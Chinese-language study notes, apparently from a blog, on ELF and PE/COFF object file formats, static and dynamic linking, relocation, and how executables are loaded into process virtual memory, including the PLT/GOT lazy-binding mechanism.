<h3 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h3><p>.rodata1    Read only Data，这种段里存放的是只读数据，比如字符串常量、全局const变量，跟”.rodata”一样。</p>
<p>.comment    存放的是编译器版本信息，比如字符串:”GCC(GNU)4.2.0”</p>
<p>.debug    调试信息</p>
<p>.dynamic    动态链接信息</p>
<p>.hash    符号哈希表</p>
<p>.line    调试时的行号表，即源代码行号与编译后指令的对应表</p>
<p>.note    额外的编译信息，比如程序的公司名称、发布版本号等</p>
<p>.strtab    String Table。字符串表，用于存储ELF文件中用到的各种字符串</p>
<p>.symtab    Symbol Table符号表</p>
<p>.shstrtab    Section String Table段名表，用于保存段表中用到的字符串，最常见的就是段名</p>
<p>.plt和.got    动态链接的跳转表和全局入口表</p>
<p>.init和.fini    程序初始化与终结代码段</p>
<p>这些表名是系统保留的(以”.”为前缀)，应用程序也可以使用一些非系统保留的名字作为段名。</p>
<h2 id="ELF文件头"><a href="#ELF文件头" class="headerlink" title="ELF文件头"></a>ELF文件头</h2><p>ELF目标文件格式的最前部是ELF文件头。ELF文件头包含了描述整个文件的基本属性，比如ELF文件版本、目标机器型号、程序入口地址等。其中ELF文件中与段有关的重要结构就是段表</p>
<p>ELF的文件头中定义了ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表的位置和长度及段的数量等。</p>
<h3 id="ELF魔数"><a href="#ELF魔数" class="headerlink" title="ELF魔数"></a>ELF魔数</h3><p>最前面的16个字节被ELF标准规定来标识ELF文件的平台属性，比如这个ELF字长（32位/64位）、字节序、ELF文件版本。如图所示：</p>
<p><img src="./png/ELF_magic.jpg" alt=""></p>
<p>最开始的4个字节是所有ELF文件都必须相同的标识码，这4个字节又被称为ELF文件的魔数。</p>
<p>第5个字节是用来标识ELF的文件类的，0x01表示是32位的，0x02表示是64位的。</p>
<p>第6个字节是字节序，规定该ELF文件是大端还是小端的。</p>
<p>第7个字节规定ELF文件的主版本号，一般是1。</p>
<p>后面9个字节ELF标准没有定义，一般填0，有些平台会使用这9个字节作为扩展标志。</p>
<h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><table>
<thead>
<tr>
<th align="left">常量</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ET_REL</td>
<td>1</td>
<td>可重定位文件，一般为.o文件</td>
</tr>
<tr>
<td align="left">ET_EXEC</td>
<td>2</td>
<td>可执行文件</td>
</tr>
<tr>
<td align="left">ET_DYN</td>
<td>3</td>
<td>共享目标文件，一般为.so文件</td>
</tr>
</tbody></table>
<h3 id="机器类型"><a href="#机器类型" class="headerlink" title="机器类型"></a>机器类型</h3><table>
<thead>
<tr>
<th>常量</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>EM_M32</td>
<td>1</td>
<td>AT&amp;T WE 32100</td>
</tr>
<tr>
<td>EM_SPARC</td>
<td>2</td>
<td>SPARC</td>
</tr>
<tr>
<td>EM_386</td>
<td>3</td>
<td>Inter x86</td>
</tr>
<tr>
<td>EM_68K</td>
<td>4</td>
<td>Motorola 68000</td>
</tr>
<tr>
<td>EM_88K</td>
<td>5</td>
<td>Motorola 88000</td>
</tr>
<tr>
<td>EM_860</td>
<td>6</td>
<td>Intel 80860</td>
</tr>
</tbody></table>
<h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>段表是一个描述了ELF文件包含的所有段的信息，比如每个段的段名、段的长度、在文件中的偏移、读写权限及段的其他属性。</p>
<p>ELF文件的段结构就是由段表决定的，编译器、链接表和装载器都是依靠段表来定位和访问各个段的属性的。</p>
<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><h3 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h3><p>包含字符串表和段表字符串表</p>
<h2 id="符号-1"><a href="#符号-1" class="headerlink" title="符号"></a>符号</h2><p>在链接中，将函数和变量统称为符号，函数名或变量名就是符号名</p>
<p>每一个目标文件都会有一个相应的符号表，其中记录了目标文件中所用到的所有符号。每个定义的符号都有一个对应的值，叫做符号值，对于变量和函数来说，符号值就是它们的地址。</p>
<h3 id="强符号"><a href="#强符号" class="headerlink" title="强符号"></a>强符号</h3><h3 id="弱符号"><a href="#弱符号" class="headerlink" title="弱符号"></a>弱符号</h3><p>编译器将未初始化的全局变量定义作若符号处理。</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><h4 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h4><p>若对外部目标文件的符号引用在目标文件被最终链接成可执行文件时，它们需要正确决议，如果没有找到该符号的定义，连接器就会报错，这种被称为强引用</p>
<h4 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h4><p>在处理弱引用时，如果该符号有定义，则链接器将该符号的引用决议；如果该符号未被定义，则链接器对该引用不报错。</p>
<p>一般对未定义的弱引用，链接器默认其为0，或者是一个特殊的值。</p>
<h1 id="静态链接-1"><a href="#静态链接-1" class="headerlink" title="静态链接"></a>静态链接</h1><h2 id="空间与地址分配"><a href="#空间与地址分配" class="headerlink" title="空间与地址分配"></a>空间与地址分配</h2><p>“链接器为目标文件分配地址和空间。”这句话中的””地址和空间有两个含义：一是在输出的可执行文件中的空间；二是在装载后的虚拟地址中的虚拟空间。</p>
<h3 id="按序叠加"><a href="#按序叠加" class="headerlink" title="按序叠加"></a>按序叠加</h3><p>将输入的目标文件安装次序叠加。</p>
<h3 id="相似段合并"><a href="#相似段合并" class="headerlink" title="相似段合并"></a>相似段合并</h3><p>将相同性质的段合并到一起</p>
<h3 id="两步链接"><a href="#两步链接" class="headerlink" title="两步链接"></a>两步链接</h3><h4 id="第一步：空间与地址分配"><a href="#第一步：空间与地址分配" class="headerlink" title="第一步：空间与地址分配"></a>第一步：空间与地址分配</h4><p>扫描所以的输入目标文件，并且获得它们的各个段的长度、属性和位置，并且将输入目标文件中的符号表中所以符号定义和符号引用收集起来，统一放到一个全局符号表。这一步中，链接器将能够获得所有输入目标文件的段长度，并且将它们合并，计算出输出文件中各个段合并后的长度和位置，并建立映射关系。</p>
<h4 id="第二步：符号解析与重定位"><a href="#第二步：符号解析与重定位" class="headerlink" title="第二步：符号解析与重定位"></a>第二步：符号解析与重定位</h4><p>使用上面第一步中收集到的所有信息，读取输入文件中段的数据、重定位信息，并且进行符号解析与重定位、调整代码中的地址等。第二步是链接过程的核心，特别是重定位过程。</p>
<h4 id="VMA和LMA"><a href="#VMA和LMA" class="headerlink" title="VMA和LMA"></a>VMA和LMA</h4><p>VMA表示虚拟地址，LMA表示加载地址，正常情况下是一致的，但有些嵌入式系统中，LMA和VMA不同。</p>
<p>链接前，目标文件中的所有段的VMA都是0，因为虚拟空间还没有被分配，所以默认都是0；链接后，可执行文件中的各个段都被分配到了相应的虚拟地址。</p>
<h3 id="符号地址的确定"><a href="#符号地址的确定" class="headerlink" title="符号地址的确定"></a>符号地址的确定</h3><h2 id="符号解析与重定位"><a href="#符号解析与重定位" class="headerlink" title="符号解析与重定位"></a>符号解析与重定位</h2><h3 id="重定位-1"><a href="#重定位-1" class="headerlink" title="重定位"></a>重定位</h3><p>在链接阶段，根据符号的地址把每个在编译器时预留的临时假地址修正为真正的地址。</p>
<h3 id="重定位表-1"><a href="#重定位表-1" class="headerlink" title="重定位表"></a>重定位表</h3><p>重定位表也叫重定位段，用来报存与重定位相关的信息，描述如何修改相应的段里的内容。</p>
<p>每个要被重定位的地方叫一个重定位入口，重定位入口的偏移表示该入口在要被重定位的段中的位置。</p>
<h3 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h3><p>重定位的过程中，每个重定位的入口都是对一个符号的引用，那么当链接器需要对某个符号的引用进行重定位时，它就要求顶这个符号的目标地址。这时候链接器就会去查找由所有输入目标文件的符号表组成的全局符号表，找到相应的符号后进行重定位。</p>
<h3 id="指令修正方式"><a href="#指令修正方式" class="headerlink" title="指令修正方式"></a>指令修正方式</h3><h4 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h4><p>近址寻址或远址寻址</p>
<p>绝对寻址或相对寻址</p>
<p>寻址长度为8位、16位、32位或64位</p>
<h4 id="32位x86下的ELF修正方式"><a href="#32位x86下的ELF修正方式" class="headerlink" title="32位x86下的ELF修正方式"></a>32位x86下的ELF修正方式</h4><p>绝对近址32位寻址</p>
<p>相对近址32位寻址</p>
<p>这两种重定位方式指令修正方式：每个被修正的位置的长度都是32位，即4个字节；而且都是近址寻址，不用考虑段间远址寻址。</p>
<table>
<thead>
<tr>
<th>宏定义</th>
<th>值</th>
<th>重定位修正方法</th>
</tr>
</thead>
<tbody><tr>
<td>R_386_32</td>
<td>1</td>
<td>绝对寻址修正 S+A</td>
</tr>
<tr>
<td>R_386_PC32</td>
<td>2</td>
<td>相对寻址修正 S+A-P</td>
</tr>
</tbody></table>
<p>A=保存在被修正位置的值</p>
<p>P=被修正的位置（相对于段开始的偏移量或者虚拟地址）。注意：该值可通过r_offset计算得到</p>
<p>S=符号的实际地址，即由r_info的高24位指定的符号的实际地址</p>
<p>即绝对寻址修正后的地址为该符号的实际地址；相对寻址修正后的地址为符号距离被修正位置的地址差。</p>
<h2 id="COMMON块"><a href="#COMMON块" class="headerlink" title="COMMON块"></a>COMMON块</h2><h2 id="C-相关问题"><a href="#C-相关问题" class="headerlink" title="C++相关问题"></a>C++相关问题</h2><h3 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a>重复代码消除</h3><h4 id="函数级别链接"><a href="#函数级别链接" class="headerlink" title="函数级别链接"></a>函数级别链接</h4><h3 id="全局构造与析构"><a href="#全局构造与析构" class="headerlink" title="全局构造与析构"></a>全局构造与析构</h3><h3 id="init段和-fini段"><a href="#init段和-fini段" class="headerlink" title=".init段和.fini段"></a>.init段和.fini段</h3><p>如果将一个函数放到.init或.fini段中，在main函数执行前后执行后会执行这个函数。</p>
<h4 id="init段"><a href="#init段" class="headerlink" title=".init段"></a>.init段</h4><p>保存的是可执行指令，他构成了进程的初始化代码。因此，当一个程序开始运行时，在main函数被调用之前，Glibc的初始化部分安排执行这个段中的代码。</p>
<h4 id="fini段"><a href="#fini段" class="headerlink" title=".fini段"></a>.fini段</h4><p>保存着进程终止代码指令。因此，当一个程序的main函数正常退出时，Glibc会安排执行这个段中的代码。</p>
<h3 id="C-与ABI"><a href="#C-与ABI" class="headerlink" title="C++与ABI"></a>C++与ABI</h3><h4 id="ABI"><a href="#ABI" class="headerlink" title="ABI"></a>ABI</h4><p>我们把符号修饰标准、变量内存布局、函数调用方式等这些跟可执行代码二进制兼容性相关的内容称为ABI。</p>
<p>影响ABI的因素很多，硬件、编程语言、编译器、链接器、操作系统等都会影响ABI。对于C语言的目标代码来说，以下几个方面会决定目标文件之间是否二进制兼容：</p>
<ol>
<li>内置类型（如int、float、char等）的大小和在存储器中的放置方式（大端、小端、对齐方式等）。</li>
<li>组合类型（如struct、union、数组等）的存储方式和内存分布。</li>
<li>外部符号与用户定义的符号之间的命名方式和解析方式，如函数名func在C语言的目标文件中是否被解析成外部符号_func。</li>
<li>函数调用方式，如参数入栈顺序、返回值如何保持等。</li>
<li>堆栈的分布方式，比如参数和局部变量在堆栈里的位置，参数传递方法等。</li>
<li>寄存器使用约定，函数调用时哪些寄存器可以修改，哪些需要保存，等等。</li>
</ol>
<p>对于C++来说，还有以下方面：</p>
<ol>
<li>继承类体系的内存分布，如基类、虚基类在继承类中的位置等。</li>
<li>指向成员函数的指针的内存分布，如何通过指向成员函数的指针来调用成员函数，如何传递this指针。</li>
<li>如何调用虚函数，vtable的内存和分布形式，vtable指针在object中的位置等。</li>
<li>template如何实例化。</li>
<li>外部符号的修饰。</li>
<li>全局对象的构造和析构。</li>
<li>异常的产生和捕获机制。</li>
<li>标准库的细节问题，RTTI如何实现等。</li>
<li>内嵌函数访问细节</li>
</ol>
<h2 id="静态库链接"><a href="#静态库链接" class="headerlink" title="静态库链接"></a>静态库链接</h2><h2 id="链接过程控制"><a href="#链接过程控制" class="headerlink" title="链接过程控制"></a>链接过程控制</h2><h3 id="链接控制脚本"><a href="#链接控制脚本" class="headerlink" title="链接控制脚本"></a>链接控制脚本</h3><p>一般的链接器控制链接过程有如下三种方法：</p>
<ol>
<li>使用命令行来给链接器指定参数。</li>
<li>将链接指令存放在目标文件里面，编译器经常会通过这种方法想链接器传递指令。</li>
<li>使用链接器控制脚本(可以使用ld -verbose来查看ld默认的链接脚本，通过ld -T link.script可以指定脚本为链接控制脚本)</li>
</ol>
<h3 id="ld链接脚本"><a href="#ld链接脚本" class="headerlink" title="ld链接脚本"></a>ld链接脚本</h3><h1 id="Windows-PE-COFF"><a href="#Windows-PE-COFF" class="headerlink" title="Windows PE/COFF"></a>Windows PE/COFF</h1><h2 id="Windows的二进制文件格式PE-COFF"><a href="#Windows的二进制文件格式PE-COFF" class="headerlink" title="Windows的二进制文件格式PE/COFF"></a>Windows的二进制文件格式PE/COFF</h2><h2 id="PE的前身——COFF"><a href="#PE的前身——COFF" class="headerlink" title="PE的前身——COFF"></a>PE的前身——COFF</h2><p>COFF的文件头部包括两部分：一是描述文件总体结构和属性的映像头，另外一个是描述该文件中包含的段属性的段表。文件头后紧跟着的就是文件的段，包括代码段、数据段等，最后还有符号表等。除此之外，还有两个ELF文件中不存在的段：”.drectve段”和”.debug$S段”</p>
<h3 id="映像"><a href="#映像" class="headerlink" title="映像"></a>映像</h3><p>因为PE文件在装载时直接被映射到进程的虚拟空间中运行，它是进程的虚拟空间的映像。所以PE可执行文件很多时候被叫做映像文件。</p>
<h3 id="段属性"><a href="#段属性" class="headerlink" title="段属性"></a>段属性</h3><p>每个段所拥有的属性包括：段名、物理地址、虚拟地址、原始数据大小、段在文件中的位置、该段的重定位表在文件中的位置、该段的行号表在文件中的位置、标志位。</p>
<h2 id="链接指示信息（-drectve）"><a href="#链接指示信息（-drectve）" class="headerlink" title="链接指示信息（.drectve）"></a>链接指示信息（.drectve）</h2><p>“.drectve”实际上是”Directive”的缩写，它的内容是编译器传递给链接器的指令，即编译器希望告诉链接器应该怎样链接这个目标文件。</p>
<p>该段最后一个属性标志位flags，为0x100A00，其意义如下：</p>
<table>
<thead>
<tr>
<th>标志位</th>
<th>宏定义</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>0x00100000</td>
<td>IMAGE_SCN_ALLGN</td>
<td>1个字节对齐。相当于不对齐</td>
</tr>
<tr>
<td>0x00000800</td>
<td>IMAGE_SCN_LNK_REMOVE</td>
<td>最终链接成映像文件时抛弃该段</td>
</tr>
<tr>
<td>0x00000200</td>
<td>IMAGE_SCN_LNK_INFO</td>
<td>该段包含的是注释或其他信息</td>
</tr>
</tbody></table>
<h2 id="调试信息-debug"><a href="#调试信息-debug" class="headerlink" title="调试信息(.debug)"></a>调试信息(.debug)</h2><p>COFF文件中所有以”.debug”开始的段都包含着调试信息。</p>
<p>比如”.debug$S”表示包含的是符号相关的调试信息；”.debug$P”表示包含预编译头文件相关的信息；”.debug$T”表示包含类型相关的调试信息。</p>
<h2 id="COFF符号表"><a href="#COFF符号表" class="headerlink" title="COFF符号表"></a>COFF符号表</h2><p>COFF文件的符号表包含的内容几乎和ELF文件的符号表一样，主要就是符号名、符号类型、所在位置。</p>
<h2 id="Windows下的ELF——PE"><a href="#Windows下的ELF——PE" class="headerlink" title="Windows下的ELF——PE"></a>Windows下的ELF——PE</h2><p>PE文件是基于COFF的扩展，它比COFF文件多了几个结构。最主要的变化有两个：第一个是文件最开始的部分不是COFF文件头，而是DOS MZ可执行文件格式的文件头和桩代码；第二个变化是原来的COFF文件头中的”IMAGE_FILE_HEADER”部分扩展成了PE文件文件头结构”IMAGE_NT_HEADERS”，这个结构包括了原来的”Image Header”及新增的PE扩展头部结构。</p>
<h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>“IMAGE_NT_HEADERS”是PE真正的文件头，它包含了一个标记和两个结构体。标记是一个常量，对于一个合法的PE文件来说，它的值为0x00004550，按照小端字节序，它对应的是”P”、”E”、”\0”、”\0”这四个字符的ASCII码。文件头包含的两个结构分别是映像头、PE扩展头部文件结构。</p>
<h3 id="PE数据目录"><a href="#PE数据目录" class="headerlink" title="PE数据目录"></a>PE数据目录</h3><p>在Windows系统装载PE可执行文件时，往往需要很快地找到一些装载所需要的数据结构，比如导入表、导出表、资源、重定位表等。这些常用的数据的位置和长度都保存在了一个叫数据目录的结构里面，其实它就是前面”IMAGE_OPTIONAL_HEADER”结构里面的”DataDirectory”成员。这个成员是一个”IMAGE_DATA_DIRECTORY”的结构数组。</p>
<p>该结构大小为16，包含两个成员，分别是虚拟地址以及长度。DataDirectory数组里每一个袁术都对应一个包含一定含义的表。</p>
<h1 id="可执行文件的装载与进程"><a href="#可执行文件的装载与进程" class="headerlink" title="可执行文件的装载与进程"></a>可执行文件的装载与进程</h1><h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><p>每个程序被运行起来以后，它将拥有自己独立的虚拟地址空间，这个虚拟地址空间的大小有计算机的硬件平台决定，具体地说是CPU的位数决定的：</p>
<p>32位的硬件平台虚拟地址空间的地址为 0x00000000~0xFFFFFFFF。</p>
<p>64位的硬件平台虚拟空间的地址为 0x0000000000000000~0XFFFFFFFFFFFFFFFF。</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux的操作系统将虚拟地址空间分为两部分：</p>
<p>其中操作系统本身用去了一部分：从地址0xC0000000到0xFFFFFFFF，共1GB。</p>
<p>剩下的留给进程使用：从地址0x00000000到0xBFFFFFFF，共3GB。</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>对于Windows操作系统来说，它的进程虚拟地址空间划分是操作系统占用2GB，进程只剩下2GB。另外Windows有个启动参数可以将操作系统占用的虚拟地址空间减少到1GB，即跟Linux分布一样。</p>
<h3 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h3><p>从硬件层面上来讲，原先的32位地址线只能访问最多4GB的物理内存。但是自从扩展至36位地址线之后，Intel修改了页映射的方式，使得新的映射方式可以访问到更多的物理内存，Intel把这个地址扩展方式叫做PAE。</p>
<p>在应用程序里，只有32位的虚拟地址空间，但是操作系统提供一个窗口映射的方法，把这些额外的内存映射到进程地址空间中来，应用程序可以根据需要来选择申请和映射。在Windows下，这种访问内存的操作方式叫做AWE；而想Linux等UNIX类操作系统则采用mmap()系统调用来实现。</p>
<h2 id="装载的方式"><a href="#装载的方式" class="headerlink" title="装载的方式"></a>装载的方式</h2><p>程序运行时是有局部性原理的，所以可以将程序最常用的部分驻留在内存中，而将一些不太常用的数据存放在磁盘里面，这就是动态装入的基本原理。</p>
<p>覆盖装入和页映射是两种很典型的动态装载方法，原则上都是利用了程序的局部性原理。</p>
<p>动态装入的思想是程序用到哪个模块，就将哪个模块装入内存，如果不用就暂时不装入，存放在磁盘中。</p>
<h3 id="覆盖装入"><a href="#覆盖装入" class="headerlink" title="覆盖装入"></a>覆盖装入</h3><p>覆盖装入的方法把挖掘内存潜力的任务交给了程序员，程序员在编写程序的时候必须手工将程序分割成若干块，然后编写一个小的辅助代码来管理这些模块何时应该驻留内存而何时应该被替换掉。这个小的辅助代码就是所谓的覆盖管理器。</p>
<p>在多个模块的情况下，程序员需要手工将模块按照它们之间的调用依赖关系组织成树状结构。同时，覆盖管理器需要保证两点：</p>
<ol>
<li>这个树状结构中从任何一个模块到树的根的模块都叫调用路径。当该块被调用时，整个调用路径上的模块必须都在内存中。</li>
<li>禁止跨树间调用。任意一个模块不允许跨过树状结构进行调用。</li>
</ol>
<h3 id="页映射"><a href="#页映射" class="headerlink" title="页映射"></a>页映射</h3><p>页映射是将内存和所有磁盘中的数据和指令按照”页”为单位划分成若干个页，以后所有的装载和操作的单位就是页。以目前的情况，硬件规定的页的大小有4096字节、8192字节、2MB、4MB等，最常见的Intel IA32处理器一般都使用4096字节的页。</p>
<p>装载管理器需要放弃当前的页以装入新页时有多重算法，如先进先出算法(FIFO)、最少使用算法(LUR)等。</p>
<p>这个所谓的装载管理器就是现代的操作系统，更加准确的将就是操作系统的存储管理器，比如Windows对PE文件的装载以及Linux对ELF文件的装载都是这样完成的。</p>
<h2 id="从操作系统角度看可执行文件的装载"><a href="#从操作系统角度看可执行文件的装载" class="headerlink" title="从操作系统角度看可执行文件的装载"></a>从操作系统角度看可执行文件的装载</h2><h3 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h3><p>从操作系统的角度来看，一个进程最关键的特征就是它拥有独立的虚拟地址空间。</p>
<p>在有虚拟存储的情况下，进程的建立过程最开始只需要做三件事：</p>
<ol>
<li>创建一个独立的虚拟地址空间</li>
<li>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系</li>
<li>将CPU的指令寄存器设置成可执行文件的入口地址，启动运行。</li>
</ol>
<h4 id="创建虚拟空间"><a href="#创建虚拟空间" class="headerlink" title="创建虚拟空间"></a>创建虚拟空间</h4><p>虚拟空间由一组页映射函数将虚拟空间的各个页映射至相应的物理空间。创建一个虚拟空间实际上并不是创建空间而是创建映射函数所需要的相应的数据结构。在i386的Linux下，创建虚拟地址空间实际上只是分配一个页目录就可以了，甚至不设置页映射关系，这些映射关系等到后面程序发生页错误的时候再进行设置。</p>
<h4 id="读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系"><a href="#读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系" class="headerlink" title="读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系"></a>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系</h4><p>当程序执行发生页错误时，操作系统将从物理内存中分配一个物理页，然后将该”缺页”从磁盘中读取到内存中，再设置缺页的虚拟页和物理页的映射关系，这样程序才得以正常运行。</p>
<p>虚拟空间与可执行文件之间的映射关系则是：当操作系统捕获到缺页错误时，它应知道程序当前所需要的的页在可执行文件中的哪一个位置。</p>
<p>从某种角度来看，这一步是整个装载过程中最重要的一步，也是传统意义上”装载”的过程。</p>
<p>这种映射关系只是保存在操作系统内部的一个数据结构。Linux中将进程虚拟空间中的一个段叫做虚拟内存区域；在Windows中将这个叫做虚拟段。</p>
<p>操作系统在内部保存这种结构。当程序执行发生段错误时，它可以通过查找这个一个数据结构来定位错误页在可执行文件中的位置。</p>
<h4 id="将CPU指令寄存器设置成可执行文件入口，启动运行"><a href="#将CPU指令寄存器设置成可执行文件入口，启动运行" class="headerlink" title="将CPU指令寄存器设置成可执行文件入口，启动运行"></a>将CPU指令寄存器设置成可执行文件入口，启动运行</h4><p>操作系统通过设置CPU的指令寄存器将控制权交给进程，由此进程开始执行。</p>
<p>在操作系统层面上，它涉及内核堆栈和用户堆栈的切换、CPU运行权限的切换。</p>
<p>从进程的角度看，可以简单地任务操作系统执行了一条跳转指令，直接跳转到可执行文件的入口地址，即ELF文件头中保存的入口地址。</p>
<h3 id="页错误"><a href="#页错误" class="headerlink" title="页错误"></a>页错误</h3><p>上面布置执行完以后，操作系统只是通过可执行文件头部的信息建立起可执行文件和进程虚存之间的映射关系而已，真正的指令和数据都未被装入到内存中。</p>
<p>当CPU可是执行程序时，发现页面是一个空页面，于是认为这是一个页错误。CPU将控制权交给操作系统，操作系统查询第二步建立的数据结构，找到空页面所在的VMA，计算出相应的页面在可执行文件中的偏移，然后再物理内存中分配一个物理页面，将精彩中该虚拟页与分配的物理页之间建立映射关系，然后把控制权再还给进程，进程从刚才页错误的位置重新开始执行。</p>
<h2 id="进程虚存空间分布"><a href="#进程虚存空间分布" class="headerlink" title="进程虚存空间分布"></a>进程虚存空间分布</h2><h3 id="ELF文件链接视图和执行视图"><a href="#ELF文件链接视图和执行视图" class="headerlink" title="ELF文件链接视图和执行视图"></a>ELF文件链接视图和执行视图</h3><p>对于相同权限的段，把它们合并到一起当作一个段进行映射。</p>
<h4 id="Segment"><a href="#Segment" class="headerlink" title="Segment"></a>Segment</h4><p>ELF中的一个概念，实际上是从装载的角度重新划分了ELF的各个段。在将目标文件链接成可执行文件时，链接器会尽量把相同权限属性的段分配在同一空间。在ELF中把这些属性相似、又连在一起的段叫做一个”Segment”。</p>
<p>描述”Segment”的结构叫做程序头，它描述了ELF文件该如何被操作系统映射到进程的虚拟空间。</p>
<p>ELF可执行文件中有一个专门的数据结构叫做程序头表，用来保存”Segment”的信息。因为ELF目标文件不需要被装载，所以它没有程序头表，而ELF的可执行文件和共享库文件都有。</p>
<h4 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h4><p>从”Section”的角度来看ELF文件就是连接视图，从”Segment”的角度来看就是执行视图。</p>
<h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><p>段中文件所在设备主设备号和次设备号及文件节点号都是0，则表示没有映射到文件中，这种VMA叫做匿名虚拟内存区域。堆和栈属于这种段。</p>
<h4 id="进程虚拟空间的概念"><a href="#进程虚拟空间的概念" class="headerlink" title="进程虚拟空间的概念"></a>进程虚拟空间的概念</h4><p>操作系统通过给进程空间划分出一个个VMA来管理进程的虚拟空间；基本原则是将相同权限属性、有相同映像文件的映射成一个VMA；一个进程基本上可以分为如下几种VMA区域：</p>
<p>代码VMA，权限只读、可执行；有映像文件。</p>
<p>数据VMA，权限可读写、可执行；有映像文件。</p>
<p>堆VMA，权限可读写、可执行；无映像文件，匿名，可向上扩展。</p>
<p>栈VMA，权限可读写、不可执行；无映像文件，匿名，可向下扩展。</p>
<h4 id="Linux的进程虚拟空间管理的VMA的概念"><a href="#Linux的进程虚拟空间管理的VMA的概念" class="headerlink" title="Linux的进程虚拟空间管理的VMA的概念"></a>Linux的进程虚拟空间管理的VMA的概念</h4><p>Linux规定一个VMA可以映射到某个文件的一个区域，或者是没有映射到任何文件。</p>
<h4 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h4><p>一个内核模块，进程可以通过访问这个VMA来跟内核进行一些通信。<strong><em>具体可参考Linux内核模块的资料。</em></strong></p>
<h3 id="堆的最大申请数量"><a href="#堆的最大申请数量" class="headerlink" title="堆的最大申请数量"></a>堆的最大申请数量</h3><h3 id="段地址对齐"><a href="#段地址对齐" class="headerlink" title="段地址对齐"></a>段地址对齐</h3><p>在ELF文件中，对于任何一个可装载的”Segment”，它的p_vaddr除以对齐属性的余数等于p_offset除以对齐属性的余数。</p>
<h3 id="进程栈初始化"><a href="#进程栈初始化" class="headerlink" title="进程栈初始化"></a>进程栈初始化</h3><h2 id="Linux内核装载ELF过程简介"><a href="#Linux内核装载ELF过程简介" class="headerlink" title="Linux内核装载ELF过程简介"></a>Linux内核装载ELF过程简介</h2><h2 id="Windows-PE的装载"><a href="#Windows-PE的装载" class="headerlink" title="Windows PE的装载"></a>Windows PE的装载</h2><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>动态链接的基本思想：把程序安装模块拆分成各个相对独立部分，在程序运行时才将它们链接在一起形成一个完成的程序。</p>
<p>当程序被装载时，系统的动态链接器会将程序所需的所有动态链接库装载到进程的地址空间，并且将程序中所有未决议的符号绑定到相应的动态链接库中，并进行重定位工作。</p>
<p>动态链接器：ld-x.x.so。</p>
<h2 id="地址无关代码"><a href="#地址无关代码" class="headerlink" title="地址无关代码"></a>地址无关代码</h2><p>PIE：地址无关可执行文件</p>
<h2 id="延迟绑定-PLT"><a href="#延迟绑定-PLT" class="headerlink" title="延迟绑定(PLT)"></a>延迟绑定(PLT)</h2><p>当函数第一次被用到时才进行绑定（符号查找、重定位等）。</p>
<h6 id="理论上plt的结构："><a href="#理论上plt的结构：" class="headerlink" title="理论上plt的结构："></a>理论上plt的结构：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func@plt:</span><br><span class="line"></span><br><span class="line">jmp *(func@GOT)</span><br><span class="line"></span><br><span class="line">pust n</span><br><span class="line"></span><br><span class="line">push moduleID</span><br><span class="line"></span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure>

<p>其中n为func这个符号引用在重定位表”.rel.plt”中的下标。moduleID为模块的ID。</p>
<h6 id="真实："><a href="#真实：" class="headerlink" title="真实："></a>真实：</h6><p>.got前三项含义：</p>
<ol>
<li>第一项保存的是”.dynamic”段的地址，这个段描述了本模块动态链接相关的信息。</li>
<li>第二项保存的是本模块的ID。</li>
<li>第三项保存的是_dl_runtime_resolve()的地址。</li>
</ol>
<p>同时，PLT的中把上面最后两条指令放到PLT中的第一项。</p>
<h2 id="动态链接相关结构"><a href="#动态链接相关结构" class="headerlink" title="动态链接相关结构"></a>动态链接相关结构</h2><h3 id="“-interp”段"><a href="#“-interp”段" class="headerlink" title="“.interp”段"></a>“.interp”段</h3><p>该段保存一个字符串，即可执行文件所需要的动态链接器(ld.so)的路径。</p>
<h3 id="“-dynamic”段"><a href="#“-dynamic”段" class="headerlink" title="“.dynamic”段"></a>“.dynamic”段</h3><p>这个段里保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。</p>
<p>可看作动态链接下ELF文件的”文件头”</p>
<h3 id="“-dynsym”段-动态符号表"><a href="#“-dynsym”段-动态符号表" class="headerlink" title="“.dynsym”段(动态符号表)"></a>“.dynsym”段(动态符号表)</h3><p>“.dynsym”只保存的了与动态链接相关的符号</p>
